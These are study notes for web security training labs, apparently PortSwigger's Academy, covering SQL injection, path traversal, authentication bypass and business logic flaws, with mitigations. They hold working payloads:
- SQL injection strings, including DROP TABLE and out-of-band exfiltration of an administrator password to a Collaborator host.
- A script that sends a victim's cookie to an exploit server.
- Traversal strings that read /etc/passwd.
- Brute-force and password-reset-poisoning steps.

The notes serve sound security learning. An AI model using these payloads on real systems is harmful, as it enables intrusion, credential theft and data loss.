# Preliminary
- [Github Basic writing and formatting syntax](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax)
- [Windows installation tools](#windows-installation-tools)

# Web Penetration Testing Learning path
1. [TryhackMe - Web Fundamentals](https://tryhackme.com/path/outline/web)  
1. [PortSwigger - Web Security Academy](https://portswigger.net/web-security/all-topics)
   - [portswigger-websecurity-academy write-up](https://github.com/frank-leitner/portswigger-websecurity-academy/tree/main)
   - [Burp Suite Certified Practitioner Exam Study](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#identified)
1. [iNE - eWPT Web Application Penetration Tester](https://security.ine.com/certifications/ewpt-certification/)

# Table of Contents
**Server-side topics (13~113 labs)**
- [SQL Injection](#sql-injection)
  - [Lab](#sql-injection-lab)
- [Path Traversal](#path-traversal)
  - [Lab](#path-traversal-lab)
- [Authentication](#authentication)
  - [Lab](#authentication-lab)
- [Business Logic Vulnerabilities](#business-logic-vulnerabilities)
  - [Lab](#business-logic-vulnerabilities-lab)
- [Command Injection](#command-injection)
  - [Lab](#command-injection-lab)
- [Information Disclosure](#information-disclosure)
  - [Lab](#information-disclosure-lab)
- [Access Control](#access-control)
  - [Lab](#access-control-lab)
- [File Upload](#file-upload)
  - [Lab](#file-upload)
- [Race Condition](#race-condition)
  - [Lab](#race-condition)
- [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
  - [Lab](#ssrf-server-side-request-forgery)
- [NoSQL Injection](#nosql-injection)
  - [Lab](#nosql-injection)
- [XXE Injection](#xxe-injection)
  - [Lab](#xxe-injection)
- [API](#api)
  - [Lab](#api)

**Client-side topics (6-61 labs)**
- [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
  - [Lab](#csrf-cross-site-request-forgery)
- [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
  - [Lab](#xss-cross-site-scripting)
- [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
  - [Lab](#cors-cross-origin-resource-sharing)
- [Clickjacking](#clickjacking)
  - [Lab](#clickjacking)
- [DOM-based Attacks](#dom-based-attacks)
  - [Lab](#dom-based-attacks)
- [WebSockets](#websockets)
  - [Lab](#websockets)

**Advanced topics (11~94 labs)**
- [Insecure Deserialization](#insecure-deserialization)
- [Web LLM Attacks](#web-llm-attacks)
- [GraphQL API](#graphql-api)
- [Server-side Template Injection](#server-side-template-injection)
- [Web Cache Poisoning](#web-cache-poisoning)
- [HTTP Host Header](#http-host-header)
- [OAuth Authentication](#oauth-authentication)
- [JWT Attacks](#jwt-attacks)
- [Prototype Pollution](#prototype-pollution)
- [Essential Skills](#essential-skills)

**Burp extension**  
- Hackvertor: Encoding and Decoding, data transformation (hashing, encryption, decryptin, convert, string) [SQL injection]
- Turbo Intruder: sending large numbers of HTTP requests and analyzing the results [Brute-force]
- Logger++: allows the logs to be searched to locate entries which match a specified pattern [Information disclosure]
- Collaborator Everywhere: Find SSRF issues; injecting non-invasive headers designed to reveal backend systems by causing pingbacks to Burp Collaborator [Blind SSRF]
  
## SQL Injection
**How to detect**     
- single quote ' and look for errors or other anomalies
- Boolean condition `OR 1=1` and `OR 1=2`
- time delays

**Basic SQL**  
- `' OR 1=1 --`

**In-band: Error-Based Injection**  
- `'; SELECT 1/0 --`

**In-band: Union-Based Injection**  
- Determine the number of columns required: `' ORDER BY 1--`  OR `' UNION SELECT NULL,NULL--`
- Oracle specific syntext: `' UNION SELECT NULL FROM DUAL--`
- Retrieve other records: `' UNION SELECT 1, username, password FROM users --`

**Blind: Boolean-based Injection**  
- `' AND '1'='1` (Return results)
- `' AND '1'='2` (No results)
- `' AND SUBSTRING(@@version, 1, 1)='M'` (Check if the first character is 'M')
- Automate the payload (Burpsuite Intruder)

**Blind: Time-Base Injection**  
- `'; WAITFOR DELAY '0:0:10' --`

**Out-of-Band (OOB) Injection**  
- `'; EXEC xp_cmdshell('nslookup yourdomain.com') --`

**Second order/Stored Injection**  
- username: `attacker'--`: unauthorized access
- `INSERT INTO users (username, password) VALUES ('attacker'--', 'password123');`
- username: `JohnDoe'); DROP TABLE users;--`: delete table
- `INSERT INTO users (username, password) VALUES ('JohnDoe'); DROP TABLE users;--', 'password123');`  

**Examine the specific database**  
- DB version: Microsoft, MySQL: @@version； PostgreSQL： version()；Oracle: SELECT banner FROM **v$version**
- Comment: Others: --, /* */; MySQL: #
- **All DB except Oracle**: SELECT TABLE_NAME FROM information_schema.tables, SELECT * FROM information_schema.columns WHERE TABLE_NAME = 'Users'
- **Oracle**: SELECT * FROM all_tables, SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
- Oracle built-in table: ' UNION SELECT NULL FROM **DUAL**--
- String concatenation: PostgreSQL, Oracle ||, Microsoft +, MySQL <SPACE>
- Substring: Others: SUBSTRING('footbar', 4, 2); Oracle: SUBSTR('footbar', 4, 2)
- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

**Remediation**
- Prepared Statements (With Parameterized Queries)
  `PreparedStatement pstmt = connection.prepareStatement(query);`
- Whitelisting permitted input values
- Escape Special Characters  

### SQL Injection Lab
1. SQL injection vulnerability in WHERE clause allowing **retrieval of hidden data**
   - GET /filter?category=`' OR 1=1 --`
   - Verify that the response now contains one or more unreleased products
2. SQL injection vulnerability allowing **login bypass**
   - POST /login
   - modify the body parameter username=`administrator'--`&password=password
5. SQL injection **UNION** attack, determining the **number of columns** returned by the query
   - GET /filter?category=`' UNION SELECT NULL,NULL,NULL--`
7. SQL injection UNION attack, **finding** a **column** containing **text**
   - GET /filter?category=`' UNION SELECT NULL,'abc',NULL--`
9. SQL injection UNION attack, **retrieving data** from other tables
    - GET /filter?category=`' UNION SELECT username, password FROM users--`
11. SQL injection attack, querying the **database type and version on Oracle**
    - GET /filter?category=`' UNION SELECT BANNER, NULL FROM v$version--`
13. SQL injection attack, querying the **database type and version on MySQL and Microsoft**
    - GET /filter?category=`' UNION SELECT @@version,'def'#`
15. SQL injection attack, **listing the database contents on non-Oracle databases**
    - tables: `' UNION SELECT table_name, NULL FROM information_schema.tables--`
    - columns: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--`
    - records: `' UNION SELECT username, password FROM users--`
17. SQL injection attack, **listing the database contents on Oracle**
    - tables: `' UNION SELECT table_name,NULL FROM all_tables--`
    - columns: `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--`
    - records: `' UNION SELECT USERNAME, PASSWORD FROM USERS--`
19. SQL injection UNION attack, **retrieving multiple values in a single column**
    - `' UNION SELECT NULL,username||'~'||password FROM users--`
21. **Blind SQL injection** with **conditional responses**
    - Check response  
      Cookie: TrackingId=ZZZ`' AND '1'='1`  (Welcome back)  
      Cookie: TrackingId=ZZZ`' AND '1'='2`  (No record)  
    - confirm table name: `' AND (SELECT 'a' FROM users LIMIT 1)='a`
    - confirm user name: `' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
    - confirm length of password (Burp intruder: Sniper) 
      Cookie: TrackingId=ZZZ`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='a;`  
      **Position**:§1§; **Paylaods**: Numbers; From 1 to 20; **Settings**>Grep - Match: Welcome back --> Start Attack  
    - enumerate password (Burp intruder: cluster bomb)  
      Cookie: TrackingId=ZZZ`' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`  
      **Position**:§1§,§a§; **Paylaods**: payload 1: numbers; payload 2: brute forcer a-z,0-9
    - Automation [Python script](https://github.com/sandunigfdo/Web-Security-Academy-Series/blob/2be2887b7a2818dd6e7d5f0ed1ac6b01fcfcac28/SQL%20injection/sqli-Lab11.py)  
      py sqli-Lab11.py [https://xxx.web-security-academy.net/]  
      [+] Retrieving administrator password.... rvxvtobfe7e_____
23. **Blind SQL injection** with **conditional errors**
    - Check response  
      Cookie: TrackingId=ZZZ`'` (Error)  
      Cookie: TrackingId=ZZZ`''` (No Error)  
    - confirm table name: TrackingId=ZZZ`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
    - confirm user name: TrackingId=ZZZ`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    - confirm length of password (Burp intruder: Sniper)  
      TrackingId=ZZZ`'||(SELECT CASE WHEN LENGTH(password)=§1§ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
       **Position**:§1§; **Paylaods**: Numbers; From 1 to 20;-->Start Attack-->Find 500 response code  
    - enumerate password (Burp intruder: cluster bomb)  
      TrackingId=ZZZ`'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
      **Position**:§1§,§a§; **Paylaods**: payload 1: numbers; payload 2: brute forcer a-z,0-9-->Start Attack-->Find 500 response code
25. Visible **error-based** SQL injection
    - Single quote to output verbose error message  
      Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'vwGUdLnAnuxjsJBf''. Expected  char
    - `' AND CAST((SELECT 1) AS int)--`  
      ERROR: argument of AND must be type boolean, not type integer Position: 63
    - `' AND 1=CAST((SELECT 1) AS int)--`  
      No error  
    - `' AND 1=CAST((SELECT username FROM users) AS int)--`  
      Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'vwGUdLnAnuxjsJBf' AND 1=CAST((SELECT username FROM users) AS'. **Expected  char**
    - Delete cookie value to free up some additional characters. Resend the request  
      ERROR: **more than one row** returned by a subquery used as an expression  
    - `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`  
      ERROR: invalid input syntax for type integer: "**administrator**"  (leaks the first username)
    - `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`  
      ERROR: invalid input syntax for type integer: "**41nsvq98jt6vtegvlafu**"
27. Blind SQL injection with **time delays**
    - `'||pg_sleep(10)--`
29. Blind SQL injection with **time delays** and **information retrieval**
    - Note: URL encode key character ';' = '%3B'
    - Test true condition time delay  
      `'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(3) END--`
    - Test false condition and no time delay  
      `%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(3) END--`
    - Verify username is 'administrator'. Condition is true, time delay  
      `'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--`
    - Retrieve password length (Burp Intruder: Sniper)-->**Click columns-->Response Received**-->To monitor time response  
      `'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)=§1§) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--`
    - Extract a single character from the password (Burp Intruder:Cluster Bomb)-->Resource Pool-->Max 1 concurrent request
      `'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--`
31. Blind SQL injection with **out-of-band** interaction
    - Perform a DNS lookup to an external domain. Use Burp Collaborator client to generate a unique Burp Collaborator subdomain, and then poll the collaborator server to confirm that a [DNS lookup](https://portswigger.net/web-security/sql-injection/cheat-sheet#DNS%20lookup) occurred.
    - Click Burp Menu-->**Burp Collaborator Client**-->Button 'Copy to clipboard'
    - `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
    - Convert payload to URL encode format then send request
    - Click Button '**Poll now**'  
33. Blind SQL injection with **out-of-band data exfiltration**
    - `EXTRACTVALUE` is an Oracle SQL function that retrieves the value of a specified XML element.
    - `xmltype(...)` creates an XMLType from the given string.
    - `<?xml version="1.0" encoding="UTF-8"?>` is XML declaration.
    - `<!DOCTYPE root [ ... ]>` defines a Document Type Definition (DTD) for the XML.
    - `<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">` defines an external entity %remote that fetches content from a remote URL. The URL is dynamically constructed by concatenating a static string ("http://) with the result of a subquery (SELECT password FROM users WHERE username='administrator') and a static string ('.BURP-COLLABORATOR-SUBDOMAIN/").
    - `%remote;` This entity reference is used to include the content fetched from the remote URL into the XML document.
    - `FROM dual` is a dummy table used in Oracle databases when a table reference is required but no actual table is necessary.
    - `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
    - In burp colloborator, click button 'Poll now'. Read the description: The Collaborator server received a DNS lookup of type AAAA for the domain name **7rma86kuw6xbyvgxltiy**.7169ftyykb10b1kwbjhbipnfz65wtl.oastify.com  
35. SQL injection with **filter bypass** via **XML encoding**
    - Search for **XML body parameter** `<storeId>1</storeId>`
    - Install Burp extensions:**Hackvertor**
    - `<storeId>1 UNION SELECT NULL</storeId>` **WAF detected**
    - Highlight your input, right=click, then select Extensions > Hackvertor > Encode > **hex_entities**
      `<@hex_entities>1 UNION SELECT NULL<@/hex_entities>`
    - **Concatenate** the returned usernames and password: administrator~seqzzom9u0zc7ixuy3cg  
      `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`

## Path Traversal
**Default root directories**
| Web Server         | Operating System     | Default Root Directory      |
|--------------------|----------------------|-----------------------------|
| Apache HTTP Server | Linux                | `/var/www/html`             |
|                    | Debian/Ubuntu        | `/var/www/html`             |
|                    | CentOS/RHEL          | `/var/www/html`             |
|                    | Fedora               | `/var/www/html`             |
|                    | SUSE/openSUSE        | `/srv/www/htdocs`           |
| Nginx              | Linux                | `/usr/share/nginx/html`     |
|                    | Debian/Ubuntu        | `/var/www/html`             |
|                    | CentOS/RHEL          | `/usr/share/nginx/html`     |
|                    | Fedora               | `/usr/share/nginx/html`     |
|                    | SUSE/openSUSE        | `/srv/www/htdocs`           |
| Microsoft IIS      | Windows Server       | `C:\inetpub\wwwroot`        |
| Apache Tomcat      | Cross-platform       | `/var/lib/tomcat/webapps`   |

**OS folder directory**  
- Linux forward slash: `../../../etc/passwd`
- Windows backslash: `..\..\..\windows\win.ini`

**Interesting files**
| Operating System          | File Path                              | Description                                                   |
|---------------------------|----------------------------------------|---------------------------------------------------------------|
| **Linux and Unix-like**   | `/etc/passwd`                          | User account information                                      |
|                           | `/etc/shadow`                          | Encrypted passwords (requires elevated privileges)             |
|                           | `/var/log/auth.log`                    | Authentication logs                                           |
|                           | Web server configuration files, e.g., `/etc/nginx/nginx.conf` | Server configuration settings                      |
| **Windows**               | `C:\Windows\System32\config\SAM`       | Windows system account information                           |
|                           | `C:\boot.ini`                          | Boot configuration (older Windows versions)                    |
|                           | `C:\Windows\win.ini`                   | Initialization file settings                                  |
|                           | Web server configuration files, e.g., `C:\xampp\apache\conf\httpd.conf` | Server configuration settings          |
| **Web Application Context**| Web root directory files, e.g., `index.html`, `default.aspx` | Default web pages                        |
|                           | `.htaccess`                            | Apache configuration file in web root                          |
|                           | User-uploaded files stored in accessible directories         | Uploaded content                                              |
|                           | Application configuration files, e.g., `web.config` (ASP.NET), `application.properties` (Java) | Application settings        |
|                           | Log files, e.g., `access.log`, `error.log`                   | Application and server logs                                   |


**Techniques**
| Technique                   | Description                                                                 | Example                         | Defense Strategy                                                                 |
|-----------------------------|-----------------------------------------------------------------------------|---------------------------------|----------------------------------------------------------------------------------|
| Dot-Dot-Slash (`../`)       | Traverses up one directory level relative to the current directory          | `../../../../etc/passwd`        | Input validation, normalize paths, restrict access to known directories            |
| Encoded Characters          | Uses URL encoding (%2e%2e%2f) to obfuscate traversal sequences              | `..%252f..%252fetc/passwd`      | Decode URL parameters, enforce strict input validation                            |
| Absolute Path Traversal     | Directly accesses files using absolute paths                                | `/etc/passwd`                   | Validate input against allowed directories, avoid user-controlled absolute paths  |
| Null Byte (%00)             | Terminates string interpretation, bypasses file extension restrictions      | `../../../etc/passwd%00.jpg`    | Filter out null bytes, enforce strict input validation                            |
| Unicode/UTF-8 Encoding      | Uses encoded Unicode characters to represent traversal sequences            | `..%c0%af..%c0%afetc/passwd`    | Normalize Unicode characters, validate and sanitize input                         |
| Double URL Encoding         | Encodes characters multiple times to bypass input filters                   | `..%252e%252e%252fetc/passwd`   | Decode multiple times, validate and sanitize input                                |
| Alternative Data Streams    | Exploits NTFS file system feature to access hidden data streams             | `file.txt::$DATA`               | Restrict access to filesystem features, sanitize input parameters                 |
| Bypass Normalization        | Exploits differences in path normalization algorithms                      | `..\/..\/etc/passwd`            | Use consistent path normalization routines, sanitize and validate input           |

**Mitigation**  
- Input validation and sanitization (validate input, reject unsafe chrs, use whitelist)
- Canonicalization of Paths  
  ```Java
  File file = new File(BASE_DIRECTORY, userInput);
  if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
  } 
  ```
- Allowlisting for file inclusion and access
- Configure server settings to disallow remote file inclusion and limit the ability of scripts to access the filesystem. PHP `allow_url_fopen` `allow_url_include`

### Path Traversal Lab  
1. File path traversal, simple case
   - check for image request traffic: Use **burp site map filter**-->check '**Images**'-->Apply
   - GET /image?filename=`../../../../etc/passwd`
3. File path traversal, traversal sequences blocked with **absolute path bypass**
   - GET /image?filename=`/etc/passwd`
5. File path traversal, traversal sequences **stripped non-recursively**
   - GET /image?filename=`....//....//....//etc/passwd` (bypass blacklist `../`)
7. File path traversal, traversal sequences **stripped with superfluous URL-decode**
   - **URL encoding** %2f: `..%2f..%2f..%2fetc/passwd`
   - **URL double encoding** %252f: `..%252f..%252f..%252fetc%252fpasswd`
9. File path traversal, validation of **start of path**
    - GET /image?filename=`/var/www/images/../../../etc/passwd`
11. File path traversal, validation of **file extension with null byte bypass**
    - GET /image?filename=`../../../etc/passwd%00.png`

## Authentication
**Types of Authentication**  
- Password-based login
  - username: business login in format of firstname.lastname; profile name same as login username; email address disclosed in HTTP response such as administrator or IT support
  - password: min chr + lower and uppercase letter + 1 special character. Fine tune the wordlist such as 'Mypassword1!', 'Mypassword2!'
  - Infer correct credential: status code, error message, response times
  - account locking  - pick a max 3 password guessess + list of victim user
  - credential stuffing - resuse the same username and password on multiple website
  - bypass IP blocking - change 'X-Forwarded-For'
- HTTP basic authentication
  - identify the authorization header in the request: `Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=`
  - Decode the Base64 string to get username:password
  - Use burp suite's intruder to brute force attack
- Multi-factor authentication  
  - skip to "logged-in only" pages after completing the first authentication step
  - attack log in using their credentials but change the 'account' cookie to any arbitrary username when submitting the verification code
  - brute-force 2FA verification codes by using 'Turbo Intruder' burp extension.
- OAuth authentication
- Other authentication mechanism
  - predictable/cleartext/stealing cookie value (remember me)
  - resetting user password (sending passwords by email, easily guess reset password URL, steal another user's token and change their password)   
- authentication flaw
  - email verification bypass: login without verifying email address
  - duplicate accounts: existing accounts with the same email or username
  - no current password verification
  - does not invalidate active sessions after a password change
  - no rate limiting
  - password reset links are not expiring quickly or easily guessable
  - using easily guessable security questions
  - no notification for password reset
  - login form reveals whether a username or email exists from error message
  - no account lockout after multiple failed login attempts
  - allow login from multipe locations simultaneously without any alerts
  - lack of 2FA
  - insecure session management
 
**Mitigation**   
- never disclose credential in cleartext anywhere (use HTTPS, HSTS header)    
- password policy   
- use identical, generic error msg, same HTTP status code, response time   
- IP-based user rate limiting + CAPTCHA
- verify logic flaws
- 2FA with a dedicated device or app to generate the code

### Authentication Lab
1. **Username enumeration** via different **responses**
   - Enumerate username: Burp intruder>Snipper>Simple list>username=§user1§&password=pass1  
     Observe different **response length**: Incorrect password (athena)/ Invalid username  
   - Enumerate password: Burp intruder>Snipper>Simple list>username=athena&password=§pass1§  
     Observe different **status code**: 302 (jessica)/ 200  
3. **Username enumeration** via **subtly** different **responses**  
   - Enumerate username: Burp intruder>Snipper>Simple list>username=§user1§&password=pass1-->  
     **Grep - Extract**-->Add-->highlight the text content "Invalid username or password."-->OK  
     Observe different **response length**: Invalid username or password (applications)/ Invalid username or password.  
   - Enumerate password: Burp intruder>Snipper>Simple list>username=applications&password=§pass1§  
     Observe different **status code**: 302 (monkey) / 200
5. Username enumeration via **response timing**
   - **Bypass max attempt**:You have made too many incorrect login attempts. Please try again in 30 minute(s).
   - Enumerate username:Burp intruder>**Pitchfork** (Pair up payload 1:1, 2:2, 3:3)>  
     **payload set 1: X-Forwarded-For: b§1§-->Numbers (1 to 100), Max fraction digits: 0**  
     payload set 2: username=**§user1§**: username wordlist  
     Observe the **response received (longer time)** for valid username (test few attempts to see the consistent longer response for same username)  
   - Enumerate password:Burp intruder>Pitchfork>  
     payload set 1: X-Forwarded-For: b§1§-->Numbers (1 to 100), Max fraction digits: 0  
     payload set 2: username=analyzer&password=**§pass1§**: password wordlist  
     Observe different **status code**: 302 (monkey) / 200  
7. **Broken brute-force protection**, IP block
   - **Your credentials: wiener:peter**
   - **Victim's username: carlos**
   - Enumerate password for victim user 'carlos':Burp intruder>**Pitchfork**
     Payload position-->username=§user1§&password=§pass1§
     Resource pool-->Maximum concurrent: 1
     payload set 1: wienber, carlos, wiener, carlos....
     payload set 2: peter, 123456, peter, password.....
9. **Username enumeration via account lock**
    - **Enumerate username**:Burp intruder>**Cluster bomb**
      position: username=§user§&password=pass§§
      payload set 1: username wordlist  
      payload set 2: null payloads-->Generate 5 payloads  
      **Observe the multiplle same length**：You have made too many incorrect login attempts. Please try again in 1 minute(s). Note the username
    - **Enumerate password**:Burp intruder>**Snipper**
      username=ai§&password=§pass1§  
      payload set 1: password wordlist
      **Grep - Extract: Invalid username or password.**
      Obsereve the empty extract column: note the password
11. Broken brute-force protection, **multiple credentials per request (Expert)**
    - replace the single string value of password with an array of password wordlist  
    - 302 response-->right click request-->show response in browser  
    ```json
    {
    "username" : "carlos",
    "password": [
        "123456",
        "password",
        "qwerty"
        ...
    ]
    ```
13. **2FA simple bypass**
    - skip to logged in page after 1FA
15. **2FA broken logic**
    - POST /login HTTP/2  
      **username=wiener**&password=peter
    - 1 step authentication  
      GET /login2 HTTP/2  
      Cookie: verify=wiener; session=xxx  
    - POST /login2 HTTP/2  
      Cookie: verify=wiener; session=xxx   
      mfa-code=0950  
    - Logout from my account  
    - send to **repeater**: GET /login2 HTTP/2 to repeater  (**change verify=carlos;**)  
    - send to **intruder**: POST /login2 HTTP/2  
      Cookie: verify=carlos; session=xxx  
      **mfa-code=§1381§**  
      Burp intruder-->Sniper-->payload brute forcer 0...9, min/max length 4  
    - Load the 302 response in the browser  
17. **2FA bypass using a brute-force attack (Expert)**
    - Burp capture request > Login (carlos:montoya) with wrong MFA code  
    - Setting > Project > Sessions > Add session handling rule > click tab 'scope' > URL scope > include all urls  
    - click Tab 'Details' > Add rule actions > Run a macro > Add select macro > select 3 requests > click OK button  
      - GET /login  
      - POST /login
      - GET /login2
    - click button 'testmacro' > verify the response - please enter your 4 digit code > OK...OK...OK
    - send to intruder > POST /login2  
      position: mfa-code = $2222$
      payload: Numbers from 0 9999 step 1, min/max 4 digits, max fraction digits 0, resource pool: max concurrent requests 1
    - Load the 302 response in the browser
19. Brute-forcing a **stay-logged-in cookie**
    - Your credentials: wiener:peter; Victim's username: carlos   
    - Decode d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw > wiener:51dc30ddc473d43a6011e9ebba6ca770
    - Base64 username:md5 password
    - Burp Intruder Sniper > **Payload processing** > add > load password wordlist
      - Hash: MD5   
      - Add prefix: carlos:
      - Encode: Base64-encode
    - GET /my-account?id=wiener
      Cookie: stay-logged-in=§d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw§;
21. **Offline password cracking**
    - Post a **comment**
      `<script>document.location='https://exploit-0a680029042c93b5820a0aee01dc0053.exploit-server.net/'+document.cookie</script>`
    - **Read the cookie value** in exploited server access log   
      `10.0.4.147      2024-07-10 14:26:31 +0000 "GET /secret=stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`   
    - Decode > carlos:26323c16d5f4dabff3bb136f2460a943
    - https://crackstation.net/ crack the hash: 26323c16d5f4dabff3bb136f2460a943 > carlos:onceuponatime
23. **Password reset** broken logic
   - Perform password reset
     **Password reset url** in email: https://0a6b00d9033b21ce818ee8ce00b2005e.web-security-academy.net/forgot-password?temp-forgot-password-token=a5fk32fn68feb75ik9xp91sfoekxn11j
   - Capture the password reset **traffic**
     - POST /forgot-password?**temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j
     - Body: **temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j&**username=wiener**&new-password-1=123456&new-password-2=123456
   - Send to **repeater** and modify in below
     - POST /forgot-password?temp-forgot-password-token=
     - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
25. Password reset poisoning via **middleware**
   - **Perform password reset **  
     Password reset url in email: https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?temp-forgot-password-token=5e8pujqdepap1aow7n5jiahx9ncik0wd   
   - Send to repeater and **perform password reset as victim user**   
     POST /forgot-password   
     add in header: `X-Forwarded-Host: exploit-0afc000003da9d43819b60d201bb0007.exploit-server.net`   
   - Change in below and submit   
     POST /forgot-password?temp-forgot-password-token=temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
     Response: please check your email for a reset password link   
   - Exploit server access log   
     10.0.3.157      2024-07-10 15:00:32 +0000 "GET /forgot-password?temp-forgot-password-token=**ofunlh8j6vngx003vnifub7hywv4ppw1**   
   - replace old token with new one and access the password reset url (change carlos password)   
     https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?**temp-forgot-password-token=ofunlh8j6vngx003vnifub7hywv4ppw1**   
26. **Password brute-force via password change**
     - Enter wrong current password (diff pair of new password): Current password is incorrect
     - Enter correct current password (diff pair of new password): New passwords do not match
     - Burp Intruder Sniper > **username=carlos**&current-password=**§curr123§**&new-password-1=1234&new-password-2=5678 > password wordlist
     - Grep match "New passwords do not match"

## Business Logic Vulnerabilities
**Examples of business logic vulnerabilities**   
- Excessive trust in **client-side controls**
  - Relying on client-side validations (e.g., JavaScript checks) without proper server-side validation.
  - Attackers can bypass client-side checks by manipulating the client (e.g., using browser developer tools) and sending malicious data directly to the server.   
- Failing to handle **unconventional input**
  - Not anticipating or properly validating unexpected or unconventional input.
  - Applications might not sanitize or validate input thoroughly, allowing attackers to inject harmful input, such as SQL injection, command injection, or cross-site scripting (XSS).   
- Making flawed **assumptions about user behavior**
  - Assuming users will follow a predictable and correct path or input sequence
  - Users might interact with the application in unexpected ways, leading to vulnerabilities such as authorization bypass, where an attacker might access restricted functions or data by manipulating parameters or session states   
- **Domain-specific** flaws
  - Application logic errors specific to the domain or business logic of the application.
  - Errors occur when developers do not fully understand the business rules or when complex workflows are not adequately implemented. For example, an e-commerce site might fail to properly check discount eligibility, allowing an attacker to apply discounts inappropriately.   
- Providing an **encryption oracle**
  - Exposing encryption or decryption functionality in a way that attackers can exploit to gain unauthorized access
  - If an application provides an API for encryption or decryption and does not properly secure it, attackers can use it to encrypt or decrypt data without authorization, potentially revealing sensitive information.   

**Common logic flaw vulnerabilities**
- **Race Conditions**: When two or more processes access shared resources in an uncontrolled manner, leading to unpredictable results
- **Time-of-Check to Time-of-Use (TOCTOU)**: When there is a delay between checking a condition and using the result of that check, allowing attackers to change the state in between
- **Authorization Flaws**: When applications do not properly enforce access controls, allowing users to access resources or perform actions they should not be allowed to
- **State Management Issues**: When the application improperly manages state information (e.g., session tokens, cookies), leading to session fixation or session hijacking attacks
  
**Mitigation**   
- Understand the domain that the application serves
- void making implicit assumptions about user behavior
- Maintain clear design documents and data flows for all transactions and workflows
- Write code as clearly as possible
- Note any references to other code that uses each component   

### Business Logic Vulnerabilities Lab
- Excessive trust in **client-side control**s
  - The application **does not perform adequate server-side validation** of the price parameter. It trusts the value sent by the client without verifying it against a known, legitimate price from the database
  - POST /cart
    productId=1&redir=PRODUCT&quantity=1&**price=10**    
- **2FA broken logic**
  - The application fails to properly bind the 2FA verification process to the original user's session   
  - Login my account via 2FA
  - Repeater: GET /login2 - change verify = victim user
  - Intruder: POST /login2 - brute force mfa-code
- **High-level logic** vulnerability
  - The business logic does not account for the **possibility of negative quantities**, leading to incorrect calculations of total price and quantity. **Restrict user input to values that adhere to the business rule**.
  - store credit $200
  - Add one wish list item $1000
  - Add one cheaper item $150 X (-6) quantity
  - Amend the quantity to negative number
    POST /cart
    productId=12&redir=PRODUCT&**quantity=-6**
  - $1000 - $900 = total $100 place order
- **Low-level logic** flaw
  - The total price is calculated using an integer type that can only hold values up to a certain maximum (2,147,483,647 for a 32-bit signed integer). When the total price exceeds this value, it wraps around to the minimum negative value (-2,147,483,648) due to integer overflow.
  - observing: Burp Intruder Sniper > **Payloads null payloads> continue indefinitely** > **$2,147,483,647** > wrapped around to the minimum value (**-2,147,483,648**)   
  - Add Jacket to cart. Burp Intruder > Change quantity=99 > Payloads "Null payloads" > Generate 323 payloads > max concurrent 1 requests > -$-64060.96
  - Burp Repeater > change qty to 47 > $-1221.96
  - Add a cheaper item > increase quantity > until total reduce to <$100
- Inconsistent handling of **exceptional input**
  - **Site Map** > Right click target url > **Engagement Tools > Discover content** > click button "session is not running"
  - admin page found > "Admin interface only available if logged in as a **DontWannaCry** user"
  - **Email** truncated to **255 chrs**
